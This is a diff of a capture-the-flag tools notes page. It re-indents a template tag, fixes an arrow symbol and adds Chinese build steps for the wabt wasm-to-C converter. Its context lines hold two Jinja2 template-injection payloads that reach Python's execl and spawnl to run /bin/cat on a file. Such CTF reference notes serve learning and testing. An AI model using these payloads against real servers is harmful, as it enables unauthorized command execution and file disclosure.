@@ -36,11 +36,15 @@ category: "Tools/CTF"
     {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
     {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
     ```
-{% endraw %}
+    {% endraw %}
 
 ## Others
-* wasm $\to$ c: [wabt](https://github.com/WebAssembly/wabt)
+* wasm → c: [wabt](https://github.com/WebAssembly/wabt)
     ```bash!
+    # 安裝Cmake，所有過程一定要用WSL
+    $ mkdir build && cd build
+    $ cmake ..
+    $ cmake --build .
     # 按照說明build完後進到./build
     $ ./wasm2c {wasm file path} -o {output c file path}
     ```
